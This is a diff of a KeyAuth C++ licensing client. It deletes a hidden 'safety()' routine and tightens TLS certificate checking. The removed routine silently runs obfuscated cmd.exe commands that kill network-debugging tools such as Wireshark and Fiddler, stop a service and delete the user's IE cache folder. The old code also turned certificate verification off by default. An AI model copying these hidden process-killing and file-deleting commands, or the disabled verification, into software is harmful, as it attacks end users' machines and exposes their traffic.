@@ -53,7 +53,6 @@
 
 static std::string hexDecode(const std::string& hex);
 std::string get_str_between_two_str(const std::string& s, const std::string& start_delim, const std::string& stop_delim);
-void safety();
 std::string checksum();
 void modify();
 std::string signature;
@@ -61,7 +60,6 @@ std::string signature;
 void KeyAuth::api::init()
 {
 	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)modify, 0, 0, 0);
-	safety();
 
 	if (ownerid.length() != 10 || secret.length() != 64)
 	{
@@ -91,8 +89,7 @@ void KeyAuth::api::init()
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
 
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -155,7 +152,6 @@ static size_t header_callback(char* buffer, size_t size, size_t nitems, void* us
 
 void KeyAuth::api::login(std::string username, std::string password)
 {
-	safety();
 	std::string hwid = utils::get_hwid();
 	auto data =
 		XorStr("type=login") +
@@ -165,8 +161,7 @@ void KeyAuth::api::login(std::string username, std::string password)
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -195,7 +190,6 @@ void KeyAuth::api::login(std::string username, std::string password)
 
 void KeyAuth::api::web_login()
 {
-	safety();
 
 	// from https://perpetualprogrammers.wordpress.com/2016/05/22/the-http-server-api/
 
@@ -283,8 +277,7 @@ void KeyAuth::api::web_login()
 			XorStr("&sessionid=") + sessionid +
 			XorStr("&name=") + name +
 			XorStr("&ownerid=") + ownerid;
-		auto resp = req(data, api::url, sslPin);
-		safety();
+		auto resp = req(data, api::url);
 		auto json = response_decoder.parse(resp);
 
 		// from https://github.com/h5p9sl/hmac_sha256
@@ -377,7 +370,6 @@ void KeyAuth::api::web_login()
 
 void KeyAuth::api::button(std::string button)
 {
-	safety();
 
 	// from https://perpetualprogrammers.wordpress.com/2016/05/22/the-http-server-api/
 
@@ -505,7 +497,6 @@ void KeyAuth::api::button(std::string button)
 }
 
 void KeyAuth::api::regstr(std::string username, std::string password, std::string key) {
-	safety();
 	std::string hwid = utils::get_hwid();
 	auto data =
 		XorStr("type=register") +
@@ -516,8 +507,7 @@ void KeyAuth::api::regstr(std::string username, std::string password, std::strin
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -545,7 +535,6 @@ void KeyAuth::api::regstr(std::string username, std::string password, std::strin
 }
 
 void KeyAuth::api::upgrade(std::string username, std::string key) {
-	safety();
 	auto data =
 		XorStr("type=upgrade") +
 		XorStr("&username=") + username +
@@ -553,8 +542,7 @@ void KeyAuth::api::upgrade(std::string username, std::string key) {
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -581,7 +569,6 @@ void KeyAuth::api::upgrade(std::string username, std::string key) {
 }
 
 void KeyAuth::api::license(std::string key) {
-	safety();
 	std::string hwid = utils::get_hwid();
 	auto data =
 		XorStr("type=license") +
@@ -590,8 +577,7 @@ void KeyAuth::api::license(std::string key) {
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -626,7 +612,7 @@ void KeyAuth::api::setvar(std::string var, std::string vardata) {
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 	load_response_data(json);
 }
@@ -639,7 +625,7 @@ std::string KeyAuth::api::getvar(std::string var) {
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -666,15 +652,13 @@ std::string KeyAuth::api::getvar(std::string var) {
 }
 
 void KeyAuth::api::ban() {
-	safety();
 	std::string hwid = utils::get_hwid();
 	auto data =
 		XorStr("type=ban") +
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -707,7 +691,7 @@ bool KeyAuth::api::checkblack() {
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -740,15 +724,13 @@ bool KeyAuth::api::checkblack() {
 }
 
 void KeyAuth::api::check() {
-	safety();
 	auto data =
 		XorStr("type=check") +
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
 
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -774,15 +756,13 @@ void KeyAuth::api::check() {
 }
 
 std::string KeyAuth::api::var(std::string varid) {
-	safety();
 	auto data =
 		XorStr("type=var") +
 		XorStr("&varid=") + varid +
 		XorStr("&sessionid=") + sessionid +
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -810,7 +790,6 @@ std::string KeyAuth::api::var(std::string varid) {
 
 void KeyAuth::api::log(std::string message) {
 
-	safety();
 	char acUserName[100];
 	DWORD nUserName = sizeof(acUserName);
 	GetUserNameA(acUserName, &nUserName);
@@ -824,15 +803,14 @@ void KeyAuth::api::log(std::string message) {
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
 
-	req(data, url, sslPin);
-	safety();
+	req(data, url);
 }
 
 std::vector<unsigned char> KeyAuth::api::download(std::string fileid) {
-	safety();
 	auto to_uc_vector = [](std::string value) {
 		return std::vector<unsigned char>(value.data(), value.data() + value.length() );
 	};
+
 
 	auto data =
 		XorStr("type=file") +
@@ -841,8 +819,7 @@ std::vector<unsigned char> KeyAuth::api::download(std::string fileid) {
 		XorStr("&name=") + name +
 		XorStr("&ownerid=").c_str() + ownerid;
 
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -874,7 +851,6 @@ std::vector<unsigned char> KeyAuth::api::download(std::string fileid) {
 }
 
 std::string KeyAuth::api::webhook(std::string id, std::string params) {
-	safety();
 	auto data =
 		XorStr("type=webhook") +
 		XorStr("&webid=") + id +
@@ -883,8 +859,7 @@ std::string KeyAuth::api::webhook(std::string id, std::string params) {
 		XorStr("&name=") + name +
 		XorStr("&ownerid=") + ownerid;
 
-	auto response = req(data, url, sslPin);
-	safety();
+	auto response = req(data, url);
 	auto json = response_decoder.parse(response);
 
 	// from https://github.com/h5p9sl/hmac_sha256
@@ -939,8 +914,7 @@ std::string get_str_between_two_str(const std::string& s,
 		last_delim_pos - end_pos_of_first_delim);
 }
 
-std::string KeyAuth::api::req(std::string data, std::string url, std::string sslPin) {
-	safety();
+std::string KeyAuth::api::req(std::string data, std::string url) {
 	CURL* curl = curl_easy_init();
 	if (!curl)
 		return "null";
@@ -950,19 +924,11 @@ std::string KeyAuth::api::req(std::string data, std::string url, std::string ssl
 
 	curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
 
-	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
 
 	curl_easy_setopt(curl, CURLOPT_NOPROXY, "keyauth.win");
 
-	if (sslPin != "ssl pin key (optional)")
-	{
-		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
-		curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, sslPin.c_str());
-	}
-	else
-	{
-		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
-	}
+	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
 
 	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
 
@@ -978,16 +944,6 @@ std::string KeyAuth::api::req(std::string data, std::string url, std::string ssl
 		MessageBoxA(0, curl_easy_strerror(code), 0, MB_ICONERROR);
 
 	return to_return;
-}
-
-void safety()
-{
-	WinExec(XorStr("cmd.exe /c taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1").c_str(), SW_HIDE);
-	WinExec(XorStr("cmd.exe /c taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1").c_str(), SW_HIDE);
-	WinExec(XorStr("cmd.exe /c taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str(), SW_HIDE);
-	WinExec(XorStr("cmd.exe /c sc stop HTTPDebuggerPro >nul 2>&1").c_str(), SW_HIDE);
-	WinExec(XorStr("cmd.exe /c taskkill /IM HTTPDebuggerSvc.exe /F >nul 2>&1").c_str(), SW_HIDE);
-	WinExec(XorStr("cmd.exe /c @RD /S /Q \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\" >nul 2>&1").c_str(), SW_HIDE);
 }
 
 std::string checksum()
